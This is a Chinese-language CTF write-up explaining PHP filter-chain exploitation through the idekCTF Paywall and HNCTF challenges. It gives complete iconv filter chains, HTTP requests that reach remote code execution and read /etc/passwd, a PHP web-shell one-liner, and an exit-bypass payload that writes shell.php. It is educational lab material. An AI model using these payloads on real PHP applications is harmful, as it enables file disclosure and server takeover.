---
date: 2023-02-07
authors: [probius]
description: >
   "基于最近idekctf的一道题，浅讲了一下Filter的原理和构造"
categories:
  - CTF
links:
  - docs/blog/posts/Filter.md
comments: true
---

# PHP-FilterChain详解

说起来 在HNCTF的时候就有师傅用filter链给我把一道文件包含题非预期了，一直说着研究，然后一直咕x，然后这次idek比赛就遇到了（悲

所以这篇文就小小的总结一波吧x

<!-- more -->

## 【idekCTF 2022】Paywall_WriteUp _使用filter链构造对应字符

那先看Paywall这道题。

![img](https://nssctf.wdf.ink//img/WDTJ/202302072109878.png)

附件如下：

暂时无法在飞书文档外展示此内容

题目起了之后：

![img](https://nssctf.wdf.ink//img/WDTJ/202302072109901.png)

当你点击 All about flags的时候会提示下面的信息：

```php
Thank you for your interest in The idek Times, but this article is only for premium users!
# 可以看到 只有高贵的VIP才能看到 flagx
```

我们点击两个连接，可以看到url的参数变化：

- ?p=flag
- ?p=hello-world

因为是白盒，所以直接审计代码：（这里就给关键部分的代码了）

```php
<?php
        error_reporting(0);
        set_include_path('articles/');

        if (isset($_GET['p'])) {
            $article_content = file_get_contents($_GET['p'], 1);
            
            # 使用strpos()函数检查读取的文章内容是否以“PREMIUM”或“FREE”开头
            if (strpos($article_content, 'PREMIUM') === 0) {
                die('Thank you for your interest in The idek Times, but this article is only for premium users!'); // TODO: implement subscriptions
            }
            else if (strpos($article_content, 'FREE') === 0) {
                echo "<article>$article_content</article>";
                die();
            }
            else {
                die('nothing here');
            }
        } 
    ?>
```

所以我们的思路还是比较明确，在他用`file_get_contents()` 函数从请求的文件中读取内容的时候，在flag文件的开头加一个 “FREE” 这样就能让php输出$article_content的内容。

所以这里就利用了filter链的构造，详细看这个项目：

https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d

当然也有可以直接用来梭的脚本：

https://github.com/synacktiv/php_filter_chain_generator

原理我们稍后做阐释，这里要做的是利用filter链在包含flag的文件前生成 "FREE"关键字 让php执行

`echo "<article>$article_content</article>";`从而输出包含的flag。

要注意的是，FREE的base64编码为"`RlJFRQ==`"

我们需要保证我们加入的字符和flag文件的字符能够被正常解码

即 我们得保证base64解码前 文件内容不是 (**因为convert.iconv.UTF8.UTF7会消掉等号**）

"`RlJFRQUFJFTUlVTSAtIGlkZWt7VGg0bmtfVV80X1N1YnNjUjFiMW5nX3QwX291cl9uM3dzUEhQYXBlciF9`"

否则你读不到flag，只会得到这个：

![img](https://nssctf.wdf.ink//img/WDTJ/202302072109036.png)

base64的编码原理,3位一组不足的话得补=，所以这里FREE还得补上两个字符，使得所得的base64没有"=".确保后面的内容解码成功。

（当然只要满足开头为FREE且flag前面为3的整数倍字符就行x）

所以构造的fitter链如下：

```php
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag
```

![img](https://nssctf.wdf.ink//img/WDTJ/202302072109954.png)

这里的`"\x1b$)C"`是由`convert.iconv.UTF8.CSISO2022KR`生成，因为生成链的程序默认在尾部增加了这个，后面我们会详细讲解x

flag文件的内容是"`PREMIUM - idek{Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!}`"

## 【HNCTF 2022】unf1ni3hed_web3he1 非预期 使用filter链进行RCE

首先这一道题的预期解是是session反序列化，但在前期源码获取的基础上，根据 just so so 这道题的灵感加了一个t00llll.php文件来获取源码信息，该文件的源码如下：

```php
<?php
error_reporting(0);

if (!isset($_GET['include_'])) {
    echo "使用工具的时候,要轻一点哦~";
    show_source(__FILE__);
}else{
    $include_ = $_GET['include_'];
}
if (preg_match('/sess|tmp/i', $include_)) {
    die("可恶涅,同样的方法怎么可能骗到本小姐两次!");
}else if (preg_match('/sess|tmp|index|\~|\@|flag|g|\%|\^|\&|data|log/i', $include_)) {
    die("呜呜呜,不可以包含这些奇奇怪怪的东西欸!!");
}
else @include($include_);

?>
```

该文件的本意是让选手用其读取web3he1.php的源码进行代码审计，但是过滤规则还是存在一个漏洞——即我们可以通过构造filter链直接进行RCE，详细参考的项目还是这个： https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d

当然由于我当时出题的时候 正则有这个规则 `g/i` 所以脚本使用的BIG编码不可行，得做一些平替。

所以需要自己去fuzz,这里提供一份我fuzz好的字典x：（嘘~）

用于包含的代码如下：

```php
<?=`$_GET[0]`;;/* (base64 value: PD89YCRfR0VUWzBdYDs7Lyo)
```

最后得到的一个 GET[0] 的 临时RCE，下面是攻击报文：

```php
GET /t00llll.php?include_=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO-2022-KR.UTF16|convert.iconv.ISO-IR-139.UTF-16|convert.iconv.ISO-IR-157.ISO-IR-156|convert.iconv.WINDOWS-1258.ISO_6937|convert.iconv.KOI8-T.ISO-2022-JP-3|convert.iconv.CP874.ISO2022KR|convert.iconv.CSUNICODE.UTF-8|convert.iconv.OSF00010004.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=cat+/secret/flag HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.52
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
```

之前就非预期的一位师傅的payload如下：

```php
GET /t00llll.php?include_=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.ISO_8859-14:1998.UTF32BE|convert.iconv.OSF00010009.ISO2022JP2|convert.iconv.UTF16.ISO-10646/UTF-8|convert.iconv.UTF-16.UTF8|convert.iconv.ISO_8859-14:1998.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&0=_RCE_
```

## 原理阐述

### php://filter

> 在PHP官方文档中有下面的介绍：
>
> php://filter 是一种元封装器， 设计用于数据流打开时的[筛选过滤](http://filters.html/)应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 [readfile()](http://function.readfile.html/)、 [file()](http://function.file.html/) 和 [file_get_contents()](http://function.file-get-contents.html/)， 在数据流内容读取之前没有机会应用其他过滤器。
>
> php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。

| 名称                      | 描述                                                         |
| ------------------------- | ------------------------------------------------------------ |
| resource=<要过滤的数据流> | 这个参数是必须的。它指定了你要筛选过滤的数据流。             |
| read=<读链的筛选列表>     | 该参数可选。可以设定一个或多个过滤器名称，以管道符（\|）分隔。 |
| write=<写链的筛选列表>    | 该参数可选。可以设定一个或多个过滤器名称，以管道符（\|）分隔。 |
| <；两个链的筛选列表>      | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 |

我们下面将用到的几个：没有指定的过滤器，读过滤器，写过滤器，下面给出两种方法的示例方便理解两种方法：

```php
<?php
/* 这简单等同于：
  readfile("http://www.example.com");
  实际上没有指定过滤器 */
readfile("php://filter/resource=http://www.example.com");
?>
<?php
/* 这会以大写字母输出 www.example.com 的全部内容 */
readfile("php://filter/read=string.toupper/resource=http://www.example.com");

/* 这会和以上所做的一样，但还会用 ROT13 加密。 */
readfile("php://filter/read=string.toupper|string.rot13/resource=http://www.example.com");
?>
<?php
/* 这会通过 rot13 过滤器筛选出字符 "Hello World"
  然后写入当前目录下的 example.txt */
file_put_contents("php://filter/write=string.rot13/resource=example.txt","Hello World");
?>
```

### 死亡绕过

我们以这个经典的例子当作引子：

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$content = $_POST['content'];
file_put_contents($_GET['filename'], "<?php exit; ?>".$content);
?>
```

因为exit的存在所以不管我们传入什么马，程序都会直接结束，所以我们需要想办法让`<?php exit; ?>`失效，在上面我们提到`filter`和它支持的`convert.base64`两个过滤器，在php中，base64的过滤器存在一定宽松性，base64编码中只包含64个可打印字符`(A-Za-z0-9+/=)`，而PHP在解码base64时，遇到不在其中的字符时，将会直接置空处理，我们可以这样理解：

```php
$_GET['input'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['input']);
```

仅留下合法字符串进行解码。

下面的例子：

```php
$strrr = "PD9wa<>HA<>gZ<?X>hpdDsgPz4=";//base64_encode "<?php exit; ?>"
    echo base64_decode($strrr);
    #Output: <?php exit; ?>
```

另外，在根据base64的编码原理，没有凑够4字节的倍数那么就会用=号凑齐：

比如 `a` → `base64_encode` = `"YQ=="`

所以如果要让密文正确解码，则我们得保证密文的长度必须为4的倍数。

如果密文长度不是4的倍数，我们继续拿上面的例子举例：

```php
$strrr = "PD9wa<>HA<>gZ<?X>hpdDsgPz4=";//base64_encode "<?php exit; ?>"
// 在strrr前面加以一个a
$strrr = "aPD9wa<>HA<>gZ<?X>hpdDsgPz4=";
    echo base64_decode($strrr);
    #Output: h������������?>
```

就会乱码。

那我们再回到这个问题，内容虽然被加上`<?php exit; ?>`，但前面的输入是可控的，不妨我们先使用`php://filter/write=convert.base64-decode` 来首先对其解码，这样只会剩下：`phpexit` 七个字符，到这我们再回头结合base64的解码规则——**4个一解码**，那么如果我们向下面这样构造：

```php
$strrr = "<?php exit; ?>aPD9waHAgcGhwaW5mbygpOz8+";
#Actual decoding:phpexitaPD9waHAgcGhwaW5mbygpOz8+
    echo base64_decode($strrr);
# OutPut：�^�+Z<?php phpinfo();?>
```

即：我们给`phpexit`增加一个字符使其正常解码,同时也确保我们后面的内容也正常解码。

最后payload如下：

```php
GET：?filename=php://filter/write=convert.base64-decode/resource=shell.php
POST：content=aPD9waHAgcGhwaW5mbygpOz8+
```

即可完成死亡绕过x

当然除了base64，还能使用rot13进行绕过，但其实原理都差不多，即使用filter过滤器进行构造，所以这里就不多赘述，接下来我们介绍filter过滤器中另外一个字符编码`Iconv`。

### Convert.iconv & base64

#### **特性一 base64_en/decode**

这里先提一个特性，看下面的base64加密解密过程：

![img](https://nssctf.wdf.ink//img/WDTJ/202302072109003.png)

我们将test当作base64解码再编码，重复多次我们还是可以得到test，当然前提是编码内容是4的倍数。

我们把这个记为 **特性一**

（当然如果只有三个字符也可以（注意个数限制就只能是3） 但是根据base64特性，会在末尾补上=，如果只是单纯的base64编码就无所谓啦，但我们后面还会涉及到其他编码的转换，=会被过滤掉，那么多次编码解码后内容就不对了x）

#### 特性二 convert.iconv 字符转换

我们以原理的核心，也就是`convert.iconv`的`CSISO2022KR`为例子，看下面的这一串php代码：

```
php://filter/convert.iconv.UTF8.CSISO2022KR/resource=php://temp
```

我们尝试输出它：

```php
<?php
$url = "php://filter/convert.iconv.UTF8.CSISO2022KR/resource=php://temp";
$var = file_get_contents($url);

var_dump(file_get_contents($url));# Output：string(4) "" #这里""中没有内容是因为编码的字符是不可见字符

echo bin2hex($var);# Output：1b242943 （The hexcode of “.$)C”）
```

![img](https://nssctf.wdf.ink//img/WDTJ/202302072109126.png)

当然现在可能不是很明显，我们尝试利用之前提到的PHPbase64的宽松性去强制解码再编码：

```php
<?php
$url = "php://filter/convert.iconv.UTF8.CSISO2022KR";
$url .= "|convert.base64-decode";
$var = file_get_contents($url."/resource=data://,aaa");
echo $url."|convert.base64-encode/resource=data://,aaa"."\n";
echo bin2hex($var)."\n";
var_dump(file_get_contents($url."|convert.base64-encode/resource=data://,aaa"));

#Output:

$url .= "|convert.base64-encode";
$url .= "/resource=data://,aaa";
echo $url."\n";
$var = file_get_contents($url);
echo bin2hex($var)."\n";
var_dump(file_get_contents($url));
```

上述程序的输出如下：

```php
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,aaa
09a69a 
string(3) "     ��"

php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,aaa
43616161
string(4) "Caaa"
```

![img](https://nssctf.wdf.ink//img/WDTJ/202302072110112.png)

这里先解释一下为什么不用php://temp，根据base64的宽松性，我们在上面提到过，这个解码过程可以这样理解：

```php
preg_replace('|[^a-z0-9A-Z+/]|s', '', $input);
```

所以当我们调用decode的时候首先会对非法字符进行置空，只剩下C和剩下的字符一起解码，那么我们想要还原这个C，按照base64encode的原理，至少需要4个字符，所以我们这里使用了resource=data://,aaa让C和三个a一起解码。

#### 利用——构造base64表内任意字符

在特性二中我们利用编码转换构造了一个C的base64decode串，那么能否利用`iconv`的特性构造其他字符呢？

答案是可以的，只要构造的字符在base64表内，那么就能通过不停的拼接`iconv`支持的编码，不断的利用base64特性去除非法字符，然后留下特定字符进行构造。

那么我们就可以构造`A-Za-z0-9+/=`任意字符。

既然这样，我们能否在把脑洞开大一点，我们既然能构造base64表中的任意字符，那我们讲这一串字符再进行一次base64解码不就相当于，我们能够构造不受限制的任意字符了么？！！！

#### 构造任意payload的base64形式

根据上面的结论，理论上我们可以对任意payload的base64进行构造，只需要通过编码不断扩展就行，比如下面这一个过程：

```php
<?php
$url = "php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4";
$url_2 = "php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921";
$url_3 = "php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE";

$url .= "|convert.base64-decode";
$var = file_get_contents($url."/resource=data://,aaa");
echo $url."|convert.base64-encode/resource=data://,aaa"."\n";
echo bin2hex($var)."\n";
var_dump(file_get_contents($url."/resource=data://,aaa"));

$url .= "|convert.base64-encode";
$url .= "/resource=data://,aaa";
echo $url."\n";
$var = file_get_contents($url);
echo bin2hex($var)."\n";
var_dump(file_get_contents($url));
php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode/resource=data://,aaa
d5a69a
string(3) "զ�"
php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode/resource=data://,aaa
31616161 string(4) "1aaa"

php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode/resource=data://,aaa
db569a string(3) "�V�"
php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode/resource=data://,aaa
32316161 string(4) "21aa"

php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode/resource=data://,aaa
dccdb569a6 string(5) "�͵i�"
php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode/resource=data://,aaa
334d3231 string(4) "3M21"
```

可以看到 当我们增加对应字符的编码串的时候 他会在原字符串的前端生成对应字符。

那么思路就明确了，比如我们要构造生成下面这样的php payload

```php
<?=`$_GET[0]`;;?>
```

我们只需要构造他的base64形式的反转形式最后解码，就能在字符串前端生成我们的payload了

```
PD89YCRfR0VUWzBdYDs7Pz4=` ——> `4zP7sDYdBzWUV0RfRCY98DP
```

#### Fuzz

在了解基本原理之后，我们要做的就是使用编码构造一份字典，对应base64编码中每一个合法字符。

wupco师傅已经开源过fuzz的项目了，所以我们在下面的项目分析里面直接跟进就好x

## 项目分析

### [PHP_INCLUDE_TO_SHELL_CHAR_DICT](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT) @wupco

在根据wupco师傅项目的同时把fuzz原理也一并阐述

（因为师傅的项目里面都写好了hhh~所以我就简单注释一下代码都做了什么x）

![img](https://nssctf.wdf.ink//img/WDTJ/202302072110923.png)

先简单说一下各个文件是做什么的x

- res文件夹中是fuzz好的字典，每个文件名对应一个字符hexcode，文件内容是fuzz好的链子x

（`2f` the hexcode of "`/`")

![img](https://nssctf.wdf.ink//img/WDTJ/202302072110119.png)

- `fuzzer.php`是用于fuzz构建res字典的核心程序，通过以现有的（通常是以C的编码：`convert.iconv.L1.ISO2022KR`为基础进行编码变异，逐步构建其他其他字符。
- `init`构建时候利用的文件，即`resource=`指向的文件，默认为`abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM`（足够的长x）
- `test.py`用于生成filter链，他会匹配字典中对应字符的hexcode进行拼接，同时会在`test.php`中生成对应的样例程序：

![img](https://nssctf.wdf.ink//img/WDTJ/202302072110603.png)

- `test.php`由`test.py`生成的包含对应payload的测试样例，包含`test.py`中`file_to_use`变量指向的文件：

![img](https://nssctf.wdf.ink//img/WDTJ/202302072110801.png)

- `phpresult`一个对`/etc/passwd`利用后的样例（？看样子是成功给/etc/passwd文件写入了payload（？

每个文件大概做什么我们就介绍完了，下面跟进两个核心部分，一个是fuzz脚本一个是生成脚本([test.py](http://test.py/)):

- fuzz.php

```php
<?php
error_reporting(E_ALL & ~E_WARNING);
ini_set("memory_limit", "-1");

set_time_limit(0);

if(!file_exists("./init")){
    file_put_contents('./init','abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM');
 }
$input = './init';

